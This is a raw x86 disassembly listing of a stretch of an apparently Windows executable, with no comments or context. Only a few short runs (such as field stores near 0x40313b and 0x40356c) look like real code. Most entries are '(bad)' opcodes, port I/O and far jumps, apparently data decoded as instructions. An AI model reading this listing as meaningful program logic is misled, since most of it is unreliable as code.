  4030b4:	mov    bl,0x6d
  4030b6:	or     eax,0xc0e4faa5
  4030bb:	mov    bh,0xf1
  4030bd:	push   ebx
  4030be:	lds    edx,FWORD PTR [edx-0x5fa7e64f]
  4030c4:	push   es
  4030c5:	cmp    DWORD PTR [eax-0x3fe0522c],0x8292a759
  4030cf:	dec    ebp
  4030d0:	push   0x4d
  4030d2:	aaa    
  4030d3:	xchg   ecx,eax
  4030d4:	ret    0x3296
  4030d7:	fsubr  DWORD PTR [ebp-0x8396f26]
  4030dd:	imul   edi,DWORD PTR [ebx+eiz*4],0x3912e864
  4030e4:	adc    al,0xa0
  4030e6:	lods   eax,DWORD PTR ds:[esi]
  4030e7:	dec    esp
  4030e8:	add    esp,DWORD PTR [edi-0x1f]
  4030eb:	cld    
  4030ec:	sbb    eax,0x75769a9
  4030f1:	xchg   edx,edx
  4030f3:	add    ecx,edx
  4030f5:	sub    DWORD PTR [ebp-0x2c],esp
  4030f8:	(bad)  
  4030f9:	push   es
  4030fa:	test   edi,edi
  4030fc:	dec    esp
  4030fd:	xchg   esi,eax
  4030fe:	(bad)  
  4030ff:	adc    eax,0x803d8da
  403104:	push   ds
  403105:	jno    0x40309a
  403107:	dec    ecx
  403108:	ds xchg edx,eax
  40310a:	hlt    
  40310b:	(bad)  
  40310c:	or     eax,0xe47d3d98
  403111:	jb     0x403170
  403113:	dec    edi
  403114:	push   esi
  403115:	dec    ebx
  403116:	sub    DWORD PTR [esi+eiz*4],esi
  403119:	xchg   esi,eax
  40311a:	sub    eax,0x3d4be91
  40311f:	(bad)  
  403120:	into   
  403121:	cmp    eax,0x5dc36437
  403126:	clc    
  403127:	out    dx,eax
  403128:	add    ebx,ebx
  40312a:	and    eax,0x71782e8
  40312f:	imul   edi,DWORD PTR [edx-0x70812b70],0xffffffc7
  403136:	adc    eax,eax
  403138:	je     0x4030cb
  40313a:	pop    edi
  40313b:	mov    DWORD PTR [ecx],eax
  40313d:	mov    eax,DWORD PTR [ebp-0x24]
  403140:	mov    ecx,DWORD PTR [ebp-0x8]
  403143:	mov    DWORD PTR [ecx+0x4],eax
  403146:	mov    eax,DWORD PTR [ebp-0x20]
  403149:	mov    ecx,DWORD PTR [ebp-0x8]
  40314c:	mov    DWORD PTR [ecx+0x8],eax
  40314f:	mov    eax,DWORD PTR [ebp-0x34]
  403152:	mov    ecx,DWORD PTR [ebp-0x8]
  403155:	mov    DWORD PTR [ecx+0xc],eax
  403158:	mov    eax,DWORD PTR [ebp-0x30]
  40315b:	jmp    0x403569
  403160:	mov    esi,ss
  403162:	jmp    0x4031a7
  403164:	jno    0x4031c9
  403166:	mov    ah,0xd1
  403168:	cs out 0xa4,al
  40316b:	mov    ch,0x1d
  40316d:	cmp    dl,ah
  40316f:	out    0x89,eax
  403171:	adc    eax,0x7d6f7e7e
  403176:	jle    0x4031f6
  403178:	fidivr WORD PTR [esp+ecx*8+0x46f0ee69]
  40317f:	mov    esp,0xafa444bd
  403184:	cmp    DWORD PTR [ecx-0x2a],ebp
  403187:	sub    ah,bh
  403189:	xor    BYTE PTR [ebx+esi*1-0x24],al
  40318d:	xchg   BYTE PTR [edi-0x2b30d5cc],al
  403193:	mov    WORD PTR [eax-0x47],ds
  403196:	adc    eax,0x4085c5ee
  40319b:	cli    
  40319c:	std    
  40319d:	(bad)  
  40319e:	mov    edx,0x8986d51b
  4031a3:	jmp    0xe045:0x2d23b0a
  4031aa:	hlt    
  4031ab:	push   edx
  4031ac:	jns    0x4031c6
  4031ae:	fld    TBYTE PTR [esi]
  4031b0:	adc    al,0xc7
  4031b2:	adc    al,0xd1
  4031b4:	(bad)  
  4031b5:	stc    
  4031b6:	add    edx,DWORD PTR [edi+0x1b]
  4031b9:	mov    ds:0x8914ebb6,al
  4031be:	gs cld 
  4031c0:	scas   al,BYTE PTR es:[edi]
  4031c1:	lds    edi,FWORD PTR [ebp-0x45676924]
  4031c7:	das    
  4031c8:	retf   
  4031c9:	dec    esp
  4031ca:	gs jb  0x40317d
  4031cd:	jb     0x4031a1
  4031cf:	test   DWORD PTR [ecx+0x39ff794b],0x97b431e
  4031d9:	add    dl,BYTE PTR [edx]
  4031db:	addr16 ret 0xf69
  4031df:	jmp    0xe188:0xf79c5fc6
  4031e6:	dec    edi
  4031e7:	ror    DWORD PTR [ebp-0x67f82903],1
  4031ed:	rol    BYTE PTR [edx],0x17
  4031f0:	xor    esp,DWORD PTR [eax]
  4031f2:	sub    BYTE PTR [ebx-0x52908b4f],ch
  4031f8:	add    dl,dl
  4031fa:	mov    edi,0x10e7dfbf
  4031ff:	cmp    ecx,ebx
  403201:	imul   ebx,DWORD PTR [ebx+eax*4],0x60
  403205:	mov    ds,WORD PTR [eax+0x4a750095]
  40320b:	mov    edi,0xf5516a7c
  403210:	sub    eax,0x6229b761
  403215:	cdq    
  403216:	fucomi st,st(6)
  403218:	sbb    bh,bh
  40321a:	repnz xchg bl,al
  40321d:	cmp    al,0x3f
  40321f:	mov    esp,0x38130552
  403224:	inc    eax
  403225:	dec    eax
  403226:	mov    BYTE PTR [ecx],ah
  403228:	(bad)  
  403229:	mov    eax,0xb959fb02
  40322e:	data16 add BYTE PTR [ebp+eax*4+0x45],0xd2
  403234:	aas    
  403235:	mov    bh,0x2
  403237:	out    0xcd,eax
  403239:	push   ebp
  40323a:	push   0xa73ea306
  40323f:	out    0xe3,eax
  403241:	and    ch,bl
  403243:	sti    
  403244:	mov    eax,ds:0x7b64acb1
  403249:	imul   esi,DWORD PTR [eax+edi*2],0xffffff92
  40324d:	adc    DWORD PTR [eax],esi
  40324f:	dec    esp
  403250:	lds    ebx,FWORD PTR [ecx+0x32]
  403253:	nop
  403254:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403255:	test   DWORD PTR [edi-0x65],eax
  403258:	inc    ecx
  403259:	xchg   esi,eax
  40325a:	xchg   esi,eax
  40325b:	inc    edi
  40325c:	dec    ebx
  40325d:	into   
  40325e:	nop
  40325f:	xchg   edi,eax
  403260:	adc    eax,0x6c93a8eb
  403265:	mov    eax,ds:0xc02fa567
  40326a:	mov    eax,ebx
  40326c:	int    0x44
  40326e:	aas    
  40326f:	jb     0x4031f3
  403271:	in     eax,dx
  403272:	and    DWORD PTR fs:[ecx+0x25be389f],edx
  403279:	xchg   esi,eax
  40327a:	mov    ds:0xd0bdef1f,al
  40327f:	rol    DWORD PTR [ebp-0x24],1
  403282:	out    dx,al
  403283:	xchg   BYTE PTR [edi+0x34ad9247],dl
  403289:	cwde   
  40328a:	inc    ebp
  40328b:	push   cs
  40328c:	dec    eax
  40328d:	and    al,0x48
  40328f:	add    eax,0xebac63b1
  403294:	jb     0x403291
  403296:	xor    ebp,DWORD PTR [eax]
  403298:	aas    
  403299:	adc    DWORD PTR [edi+0x14],eax
  40329c:	xchg   ax,ax
  40329e:	leave  
  40329f:	ror    DWORD PTR [ebp-0x73],0x5a
  4032a3:	dec    ebp
  4032a4:	cmp    edx,esp
  4032a6:	cmp    edx,DWORD PTR [ebp+esi*8+0x3c179c73]
  4032ad:	or     al,0xd5
  4032af:	add    eax,0xcb495a2d
  4032b4:	shl    BYTE PTR [edx],1
  4032b6:	dec    edi
  4032b7:	push   ebp
  4032b8:	icebp  
  4032b9:	dec    ebp
  4032ba:	mov    WORD PTR [edi+0x18],cs
  4032bd:	and    BYTE PTR [eax],ah
  4032bf:	mov    bh,0x9c
  4032c1:	lods   eax,DWORD PTR ds:[esi]
  4032c2:	or     al,0x66
  4032c4:	adc    al,0x86
  4032c6:	push   ebx
  4032c7:	jg     0x4032bc
  4032c9:	jmp    0x9172b6f2
  4032ce:	sub    DWORD PTR [esi+0x7c],edx
  4032d1:	loopne 0x403288
  4032d3:	push   ss
  4032d4:	jmp    0x1c98:0xde7a640d
  4032db:	imul   edx,DWORD PTR [ecx-0x6f01a563],0xffffffb7
  4032e2:	cld    
  4032e3:	push   0xf6341a9
  4032e8:	leave  
  4032e9:	xchg   edi,eax
  4032ea:	or     DWORD PTR [eax],esp
  4032ec:	xchg   esp,eax
  4032ed:	mov    eax,0x7e5e49fe
  4032f2:	xor    bl,BYTE PTR [edi-0x5f]
  4032f5:	mov    ch,0x90
  4032f7:	cmp    eax,0x1a5bcb68
  4032fc:	jne    0x403319
  4032fe:	icebp  
  4032ff:	jbe    0x40329a
  403301:	out    dx,al
  403302:	ret    
  403303:	retf   0x56da
  403306:	cmp    eax,0x64716d4d
  40330b:	aam    0x2f
  40330d:	jmp    FWORD PTR [edx+edx*8-0x3e141429]
  403314:	adc    eax,0xf8969b38
  403319:	ficomp DWORD PTR [esi]
  40331b:	add    bh,ch
  40331d:	jnp    0x403357
  40331f:	sbb    ebx,DWORD PTR [edi]
  403321:	ret    
  403322:	je     0x40335d
  403324:	xchg   esp,eax
  403325:	popa   
  403326:	in     eax,0x11
  403328:	push   0x17382230
  40332d:	lods   al,BYTE PTR ds:[esi]
  40332e:	popf   
  40332f:	idiv   BYTE PTR ds:0x12544e25
  403335:	(bad)  
  403336:	out    0xaf,al
  403338:	les    edx,FWORD PTR [ecx+0x4c617ab]
  40333e:	mov    bl,0x49
  403340:	sub    BYTE PTR [eax+0x6a2388cf],0x7f
  403347:	pushf  
  403348:	(bad)  
  403349:	aaa    
  40334a:	jle    0x403336
  40334c:	bound  edi,QWORD PTR [ebx]
  40334e:	jns    0x40335e
  403350:	(bad)  
  403352:	or     eax,0x2a21cc07
  403357:	dec    edi
  403358:	push   esp
  403359:	pusha  
  40335a:	(bad)  
  40335b:	cs (bad) 
  40335e:	jp     0x403320
  403360:	adc    DWORD PTR [eax+ebx*1-0x11],edx
  403364:	fwait
  403365:	cs xchg ebp,eax
  403367:	js     0x4033d4
  403369:	sub    ah,0x4b
  40336c:	imul   eax,edx,0x62
  40336f:	pushf  
  403370:	and    eax,0xecb361b6
  403375:	outs   dx,DWORD PTR ds:[esi]
  403376:	pop    ebx
  403377:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403378:	cld    
  403379:	scas   eax,DWORD PTR es:[edi]
  40337a:	test   DWORD PTR [ebp+edi*1-0x2c0a0e24],0x1c2eaf69
  403385:	xor    eax,0xf74092a4
  40338a:	push   0x44059bf8
  40338f:	xor    esi,DWORD PTR [edi+0x3581b8f8]
  403395:	jbe    0x403398
  403397:	sub    bh,BYTE PTR [ecx+0x30]
  40339a:	mov    bl,0xd
  40339c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40339d:	in     al,dx
  40339e:	nop
  40339f:	sub    eax,0x8b089d5d
  4033a4:	lods   eax,DWORD PTR ds:[esi]
  4033a5:	das    
  4033a6:	std    
  4033a7:	or     DWORD PTR [esi+esi*1],edi
  4033aa:	mov    dl,0x3d
  4033ac:	dec    ebx
  4033ad:	add    ebp,ecx
  4033af:	(bad)  
  4033b0:	aam    0x4f
  4033b2:	(bad)  
  4033b3:	xlat   BYTE PTR ds:[ebx]
  4033b4:	arpl   WORD PTR ds:0x4eded83f,di
  4033ba:	cmp    BYTE PTR [ebx+eiz*4],ch
  4033bd:	fsub   DWORD PTR [eax+0x11]
  4033c0:	sub    al,0xe5
  4033c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033c3:	sahf   
  4033c4:	push   cs
  4033c5:	mov    edx,DWORD PTR [edi+0x66]
  4033c8:	sbb    dl,bh
  4033ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033cb:	mov    cl,0xce
  4033cd:	retf   
  4033ce:	pop    edi
  4033cf:	or     dh,BYTE PTR [edx+0x55d956c6]
  4033d5:	mov    esp,0x3904645a
  4033da:	dec    edi
  4033db:	push   edi
  4033dc:	mov    edx,0xcd14cb4c
  4033e1:	rol    bl,cl
  4033e3:	pop    ds
  4033e4:	cmp    edx,esi
  4033e6:	(bad)  [edi]
  4033e8:	into   
  4033e9:	je     0x40341d
  4033eb:	scas   eax,DWORD PTR es:[edi]
  4033ec:	mov    edi,DWORD PTR [eax-0x2b]
  4033ef:	das    
  4033f0:	push   es
  4033f1:	mov    fs,WORD PTR [ecx-0x58673fd2]
  4033f7:	in     eax,dx
  4033f8:	or     al,0x4c
  4033fa:	sbb    ch,ah
  4033fc:	mov    DWORD PTR [edx],esp
  4033fe:	fild   WORD PTR [ebx]
  403400:	push   edx
  403401:	test   ah,al
  403403:	mov    cl,0xd1
  403405:	add    al,0x31
  403407:	cwde   
  403408:	add    BYTE PTR [edi+0x69],dl
  40340b:	mov    esp,0x7c80f665
  403410:	mov    ebp,0xde26d09e
  403415:	sub    edi,ebx
  403417:	jmp    0x432f:0xa8737bec
  40341e:	retf   0x27c9
  403421:	mov    edx,0x9521127a
  403426:	pop    edx
  403427:	xchg   DWORD PTR [edi],ebp
  403429:	loop   0x40347e
  40342b:	in     eax,dx
  40342c:	xchg   esi,eax
  40342d:	mov    ch,0xa0
  40342f:	inc    edx
  403430:	imul   DWORD PTR [edi]
  403432:	cmp    al,ch
  403434:	cld    
  403435:	cs or  eax,0x90e9b68
  40343b:	sahf   
  40343c:	push   cs
  40343d:	mov    dl,0xc7
  40343f:	scas   al,BYTE PTR es:[edi]
  403440:	mov    eax,eax
  403442:	shl    BYTE PTR [eax-0x9e4d9e5],0x56
  403449:	retf   0x798e
  40344c:	fs and cl,ch
  40344f:	stc    
  403450:	sub    DWORD PTR [eax+0x3360aa5d],0x65
  403457:	inc    esi
  403458:	je     0x4034a4
  40345a:	popa   
  40345b:	fmul   DWORD PTR [eax+0x14f38a38]
  403461:	mov    ch,0xa1
  403463:	inc    eax
  403464:	xor    al,bh
  403466:	xor    al,0xab
  403468:	(bad)  
  403469:	fbstp  TBYTE PTR [esi]
  40346b:	lods   eax,DWORD PTR ds:[esi]
  40346c:	sub    bl,BYTE PTR [edi-0x59]
  40346f:	mov    DWORD PTR ds:0xd610c66,esp
  403475:	cmp    esi,edi
  403477:	dec    esi
  403478:	in     eax,0x4f
  40347a:	das    
  40347b:	in     eax,0xb9
  40347d:	int3   
  40347e:	rcl    BYTE PTR [esi-0x41],0x8e
  403482:	fdivp  st(4),st
  403484:	jmp    FWORD PTR ds:0xf985beb3
  40348a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40348b:	das    
  40348c:	jmp    0x403429
  40348e:	shl    bl,0xc4
  403491:	sub    al,0xda
  403493:	in     al,0x51
  403495:	xchg   ebx,eax
  403496:	sub    al,0x24
  403498:	shl    DWORD PTR [edi+ecx*2+0x1f],1
  40349c:	jne    0x4034f0
  40349e:	(bad)  
  40349f:	(bad)  [edi-0x8]
  4034a2:	(bad)  
  4034a3:	mov    cl,0x3c
  4034a5:	pop    ss
  4034a6:	dec    esp
  4034a7:	fwait
  4034a8:	adc    eax,0x6af2dd6d
  4034ad:	cwde   
  4034ae:	inc    esp
  4034af:	rol    bl,0x1a
  4034b2:	pop    eax
  4034b3:	push   ecx
  4034b4:	dec    eax
  4034b5:	sbb    BYTE PTR [esi-0x6b43abd],bh
  4034bb:	loope  0x403474
  4034bd:	jne    0x4034d5
  4034bf:	pop    es
  4034c0:	push   dx
  4034c2:	lea    ebx,[ebp+0x75]
  4034c5:	nop
  4034c6:	dec    ecx
  4034c7:	pop    ebp
  4034c8:	in     al,dx
  4034c9:	sbb    eax,0x37a94a46
  4034ce:	retf   
  4034cf:	xlat   BYTE PTR ds:[ebx]
  4034d0:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034d2:	fs pop es
  4034d4:	daa    
  4034d5:	dec    edi
  4034d6:	xor    ebx,DWORD PTR [ebx-0x4c]
  4034d9:	mov    esp,0x6e7c54d4
  4034de:	cwde   
  4034df:	(bad)  
  4034e0:	in     eax,dx
  4034e1:	mov    al,dh
  4034e3:	jne    0x40353c
  4034e5:	mov    ?,WORD PTR [ebp-0x19]
  4034e8:	push   ecx
  4034e9:	inc    eax
  4034ea:	outs   dx,BYTE PTR ds:[esi]
  4034eb:	and    edx,DWORD PTR [edx-0xa77f3ec]
  4034f1:	push   es
  4034f2:	xor    DWORD PTR [eax+0x265c2387],esp
  4034f8:	adc    ebp,DWORD PTR [edx]
  4034fa:	je     0x4034e2
  4034fc:	mov    eax,0xb4951b74
  403501:	add    edi,0xcc14acc7
  403507:	out    0x40,al
  403509:	into   
  40350a:	cmp    ecx,edx
  40350c:	jne    0x403527
  40350e:	or     edx,DWORD PTR [edi]
  403510:	pop    es
  403511:	(bad)  
  403512:	xchg   ebx,eax
  403513:	xor    edx,0xffffffd3
  403516:	and    DWORD PTR [edi+edi*1+0x79],ebx
  40351a:	inc    eax
  40351b:	(bad)  
  40351c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40351d:	sub    esi,esi
  40351f:	retf   
  403520:	fimul  WORD PTR [ebp+ebp*1+0x5b]
  403524:	(bad)  
  403525:	out    0xc1,eax
  403527:	inc    esi
  403528:	mov    esi,0xbc36fb43
  40352d:	jmp    0xc4a7:0xb9a430e8
  403534:	(bad)  
  403535:	mov    ch,0x9f
  403537:	in     eax,dx
  403538:	stos   BYTE PTR es:[edi],al
  403539:	(bad)  
  40353a:	sbb    dl,BYTE PTR [ebp-0x56]
  40353d:	xchg   ecx,eax
  40353e:	out    0x9b,eax
  403540:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403541:	arpl   bx,bx
  403543:	cmp    DWORD PTR [ebx-0x74],ecx
  403546:	div    DWORD PTR [ecx+0x17242b61]
  40354c:	call   FWORD PTR [ecx]
  40354e:	shr    BYTE PTR [edi-0x76611afe],1
  403554:	inc    BYTE PTR [ebx-0x26d42309]
  40355a:	mov    edi,0x48746cca
  40355f:	mov    ah,0xc3
  403561:	cmp    al,0xfe
  403563:	pop    edi
  403564:	xchg   ebp,eax
  403565:	scas   eax,DWORD PTR es:[edi]
  403566:	out    dx,al
  403567:	sub    BYTE PTR [edi-0x75],0x4d
  40356b:	clc    
  40356c:	mov    DWORD PTR [ecx+0x10],eax
  40356f:	mov    eax,eax
  403571:	mov    eax,DWORD PTR [ebp-0x24]
  403574:	test   eax,eax
  403576:	mov    eax,DWORD PTR [ebp-0x2c]
  403579:	jne    0x403582
  40357f:	mov    eax,DWORD PTR [ebp-0x10]
  403582:	xor    eax,esi
  403584:	add    eax,edi
  403586:	jmp    0x403994
  40358b:	in     eax,dx
  40358c:	adc    ch,ch
  40358e:	ret    0xe3f1
  403591:	icebp  
  403592:	xor    DWORD PTR [eax],ebx
  403594:	xchg   esi,eax
  403595:	sbb    esp,edx
  403597:	repz mov esi,0x11860b1c
  40359d:	jle    0x40361d
  40359f:	outs   dx,DWORD PTR ds:[esi]
  4035a0:	jge    0x403620
  4035a2:	jle    0x403581
  4035a4:	mov    ds:0x17012c2c,eax
  4035a9:	(bad)  
  4035aa:	mov    ah,0x90
  4035ac:	jle    0x40356b
  4035ae:	idiv   ebx
  4035b0:	or     eax,0x412e0557
  4035b5:	push   cs
  4035b6:	imul   edx,DWORD PTR [eax],0xffffff92
  4035b9:	adc    bh,BYTE PTR [ebp+0x4e]
  4035bc:	xlat   BYTE PTR ds:[ebx]
  4035bd:	dec    ebx
  4035be:	sar    DWORD PTR [ebx+0x5e],1
  4035c1:	add    eax,esp
  4035c3:	mov    bh,0xca
  4035c5:	enter  0x1de7,0xc4
  4035c9:	push   ebp
  4035ca:	jnp    0x403578
  4035cc:	jae    0x40356b
  4035ce:	cmp    eax,DWORD PTR [ebx]
  4035d0:	aad    0x49
  4035d2:	add    DWORD PTR [esp+ecx*4-0x4561cc7d],eax
  4035d9:	mov    eax,0x36ee0450
  4035de:	or     DWORD PTR [ecx-0x55194051],eax
  4035e4:	lds    eax,FWORD PTR ds:0x8ff62614
  4035ea:	inc    esp
  4035eb:	cmp    ah,al
  4035ed:	das    
  4035ee:	xor    bh,BYTE PTR [ecx+ecx*2-0x40]
  4035f2:	dec    edx
  4035f3:	retf   0x9c45
  4035f6:	popf   
  4035f7:	cmp    dl,BYTE PTR [ebx-0x49]
  4035fa:	cs or  eax,0xa8fd77c7
  403600:	dec    esp
  403601:	sub    dl,bh
  403603:	push   esi
  403604:	adc    BYTE PTR [ebp+0x54],dl
  403607:	lea    esp,[ebx-0x9]
  40360a:	lock (bad) 
  40360c:	cmp    BYTE PTR [edx],0x6a
  40360f:	adc    eax,0x2408ca17
  403614:	inc    edx
  403615:	loopne 0x4035a4
  403617:	(bad)  
  403618:	ja     0x40363c
  40361a:	mov    bh,0x41
  40361c:	push   ecx
  40361d:	iret   
  40361e:	pop    ebp
  40361f:	mov    edi,DWORD PTR [edx]
  403621:	add    eax,0x80056009
  403626:	jmp    0x40362d
  403628:	xchg   esp,ebx
  40362a:	mov    eax,0xfb22fb22
  40362f:	clc    
  403630:	es std 
  403632:	stos   DWORD PTR es:[edi],eax
  403633:	pmaddwd mm2,QWORD PTR [ebp+edi*1+0x1d]
  403638:	xor    al,0x7e
  40363a:	jns    0x403659
  40363c:	mov    esi,0x6b909863
  403641:	inc    ebx
  403642:	mov    BYTE PTR [edi+0x4b47d2a2],al
  403648:	xchg   DWORD PTR [eax],edx
  40364a:	sbb    eax,0x7b9969ac
  40364f:	repnz ficom DWORD PTR [ecx-0x2e]
  403653:	xor    eax,0x340faab3
  403658:	mov    ebx,0x41ac63da
  40365d:	push   esi
  40365e:	sub    BYTE PTR ds:0xad141c14,al
  403664:	xchg   esp,eax
  403665:	mov    ds:0x14a981db,al
  40366a:	pop    esi
  40366b:	add    DWORD PTR [edi+0x5ecfa347],ebp
  403671:	call   0x7fe0586d
  403676:	add    al,0xc2
  403678:	mov    ebp,DWORD PTR [edx+eiz*8]
  40367b:	xor    eax,0xfd01e299
  403680:	call   0xe465dded
  403685:	xor    edx,DWORD PTR [eax+0x3d]
  403688:	fcom   DWORD PTR [ebx+0x7dc990ff]
  40368e:	xchg   DWORD PTR [esi-0x326a2c1b],edx
  403694:	jmp    0x94d66126
  403699:	les    esi,FWORD PTR [ebp+0x4e]
  40369c:	mov    bl,0xd7
  40369e:	add    ecx,DWORD PTR [edi]
  4036a0:	adc    eax,0xeff94247
  4036a5:	fadd   QWORD PTR [ebx+0x17]
  4036a8:	aaa    
  4036a9:	addr16 pushf 
  4036ab:	je     0x4036ee
  4036ad:	loop   0x40367e
  4036af:	and    edx,edi
  4036b1:	imul   edx,DWORD PTR [eax-0x71],0x6f
  4036b5:	adc    eax,0x1efe62fa
  4036ba:	push   ds
  4036bb:	outs   dx,DWORD PTR ss:[esi]
  4036bd:	mov    dh,0xee
  4036bf:	push   ds
  4036c0:	(bad)  
  4036c1:	stos   DWORD PTR es:[edi],eax
  4036c2:	adc    DWORD PTR [edx],edi
  4036c4:	or     al,0xcb
  4036c6:	inc    esp
  4036c7:	hlt    
  4036c8:	inc    esp
  4036c9:	repz retf 0x55ee
  4036cd:	lahf   
  4036ce:	fadd   QWORD PTR [edx]
  4036d0:	add    BYTE PTR [ebp-0xa],0x53
  4036d4:	cmc    
  4036d5:	xchg   esp,eax
  4036d6:	sti    
  4036d7:	dec    edi
  4036d8:	xor    eax,0x60015a8a
  4036dd:	imul   edx,edx,0x741eefbc
  4036e3:	xchg   DWORD PTR [ebx],ebp
  4036e5:	fld    TBYTE PTR [bp-0x24]
  4036e9:	push   edi
  4036ea:	xor    BYTE PTR [ebx-0x1f990d8c],bh
  4036f0:	mov    al,0x1a
  4036f2:	or     BYTE PTR [eax+ebp*8-0x4b],bh
  4036f6:	fcomp  st(4)
  4036f8:	adc    ebp,esp
  4036fa:	jmp    0x403681
  4036fc:	adc    eax,0x1ad60876
  403701:	jae    0x403761
  403703:	and    bl,BYTE PTR [esi]
  403705:	sub    al,0x1e
  403707:	dec    ebx
  403708:	retf   
  403709:	jb     0x4036c8
  40370b:	imul   ebp,DWORD PTR [edi-0x6c],0xffffffd9
  40370f:	mov    dl,BYTE PTR [ebp+0x295a73f9]
  403715:	push   edi
  403716:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403717:	jbe    0x403772
  403719:	cmc    
  40371a:	inc    ebp
  40371b:	and    al,0x34
  40371d:	inc    ecx
  40371e:	mov    edi,0x784ceb45
  403723:	shl    BYTE PTR [edi-0x24],1
  403726:	mov    al,0xcb
  403728:	cmp    DWORD PTR [edx],ecx
  40372a:	xchg   esp,eax
  40372b:	xchg   edi,eax
  40372c:	daa    
  40372d:	pop    ebp
  40372e:	add    cl,BYTE PTR [edx+0x2db99fc6]
  403734:	test   eax,0xbb3e6af2
  403739:	push   cs
  40373a:	push   esp
  40373b:	sub    al,0x10
  40373d:	call   0x2a32:0x810a333
  403744:	mov    bh,ah
  403746:	adc    BYTE PTR [edi-0x1939ccc4],0x19
  40374d:	outs   dx,DWORD PTR ds:[esi]
  40374e:	fcom   QWORD PTR [ebx-0x3016c876]
  403754:	es dec ecx
  403756:	fdivr  DWORD PTR [ebx-0x5]
  403759:	dec    edx
  40375a:	lahf   
  40375b:	jno    0x40378c
  40375d:	adc    BYTE PTR [ecx+0x1f08d452],cl
  403763:	sub    ebx,DWORD PTR [eax*2-0x3f60fa65]
  40376a:	aaa    
  40376b:	lods   eax,DWORD PTR ds:[esi]
  40376c:	mov    fs,esi
  40376e:	ds (bad) 
  403770:	dec    ebp
  403771:	push   edx
  403772:	in     eax,dx
  403773:	inc    eax
  403774:	or     ch,BYTE PTR [eax]
  403776:	enter  0x9457,0x67
  40377a:	adc    bl,ah
  40377c:	add    eax,0xcb27887b
  403781:	pop    esp
  403782:	dec    esp
  403783:	in     eax,0xd5
  403785:	js     0x403774
  403787:	push   esp
  403788:	cwde   
  403789:	adc    BYTE PTR [esi],0x93
  40378c:	dec    edx
  40378d:	ja     0x403760
  40378f:	xor    DWORD PTR [eax+edx*4-0x3015286b],eax
  403796:	fistp  QWORD PTR [eax]
  403798:	sub    ecx,DWORD PTR gs:[eax]
  40379b:	(bad)  
  40379c:	jge    0x40379b
  40379e:	adc    bh,BYTE PTR [ecx+0x3ee54ea0]
  4037a4:	jnp    0x403787
  4037a6:	mov    esp,0x19d1e9e7
  4037ab:	fiadd  DWORD PTR [ebx-0x29]
  4037ae:	jnp    0x403800
  4037b0:	push   0x30
  4037b2:	sbb    BYTE PTR [ecx+esi*2],dl
  4037b5:	out    dx,al
  4037b6:	fisttp DWORD PTR [esi+ecx*4]
  4037b9:	or     DWORD PTR ds:0x77b5b7f7,ebp
  4037bf:	or     eax,0x9cc79efb
  4037c4:	sbb    cl,BYTE PTR [ebx]
  4037c6:	out    dx,al
  4037c7:	add    al,0x9b
  4037c9:	jae    0x40374f
  4037cb:	xor    dl,BYTE PTR [ebp+0x2c7d731c]
  4037d1:	shr    DWORD PTR [edx+edx*8],cl
  4037d4:	pop    esp
  4037d5:	xchg   ecx,eax
  4037d6:	push   esi
  4037d7:	fcmove st,st(7)
  4037d9:	sbb    ebx,DWORD PTR [esi+eiz*2+0x42]
  4037dd:	loope  0x4037df
  4037df:	pushf  
  4037e0:	jle    0x403807
  4037e2:	enter  0x5bd,0x69
  4037e6:	xchg   ebx,eax
  4037e7:	xchg   esi,eax
  4037e8:	jp     0x40381d
  4037ea:	outs   dx,BYTE PTR cs:[esi]
  4037ec:	push   ebx
  4037ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037ee:	push   0xffffffdd
  4037f0:	(bad)  
  4037f1:	xchg   ebx,eax
  4037f2:	inc    ebp
  4037f3:	push   esp
  4037f4:	mov    bl,0x9b
  4037f6:	(bad)  
  4037f7:	adc    esp,DWORD PTR [esi+ecx*4]
  4037fa:	lahf   
  4037fb:	sti    
  4037fc:	pop    esi
  4037fd:	pop    eax
  4037fe:	xor    eax,0xdf2c6d7
  403803:	inc    ebx
  403804:	into   
  403805:	mov    eax,ds:0xc703d332
  40380a:	or     eax,0x56d68df4
  40380f:	xchg   edx,eax
  403810:	sub    ecx,DWORD PTR [esi-0x5894bc58]
  403816:	js     0x403890
  403818:	push   ebx
  403819:	addr16 dec ebx
  40381b:	clc    
  40381c:	push   ss
  40381d:	inc    esp
  40381e:	jge    0x4037b5
  403820:	fiadd  DWORD PTR [ebp-0x31a02420]
  403826:	fild   DWORD PTR [ebp-0x6f]
  403829:	add    eax,0xa13505e
  40382e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40382f:	ins    DWORD PTR es:[edi],dx
  403830:	mov    edx,0x985e28bf
  403835:	adc    BYTE PTR [edx+0x71f6692c],ch
  40383b:	add    al,0x1
  40383d:	add    BYTE PTR [edi+0x68],dl
  403840:	mov    ?,WORD PTR [ecx+0x2]
  403843:	push   esi
  403844:	cwde   
  403845:	pop    ds
  403846:	jecxz  0x4038a5
  403848:	pop    ebp
  403849:	into   
  40384a:	add    ch,BYTE PTR [edx]
  40384c:	rcl    BYTE PTR [edx-0x4d],1
  40384f:	mov    ds:0x9f3807b1,eax
  403854:	stc    
  403855:	repnz clc 
  403857:	sar    DWORD PTR [edx-0x27],cl
  40385a:	xchg   ebx,eax
  40385b:	add    bh,bh
  40385d:	xor    eax,0x7bc54a67
  403862:	clc    
  403863:	mov    dh,0x23
  403865:	xchg   ecx,eax
  403866:	and    DWORD PTR [ecx-0x708e742f],0xffffffb2
  40386d:	lahf   
  40386e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40386f:	or     eax,0xa1e20936
  403874:	outs   dx,DWORD PTR ds:[esi]
  403875:	ret    
  403876:	pop    ebp
  403877:	dec    edx
  403878:	pop    ecx
  403879:	call   0x8237:0xd6c8140a
  403880:	and    al,0xeb
  403882:	mov    al,0x16
  403884:	add    dh,BYTE PTR [ebp+0x791f6f50]
  40388a:	sti    
  40388b:	add    al,0x35
  40388d:	imul   bl
  40388f:	shr    DWORD PTR [ecx],0xf0
  403892:	push   ds
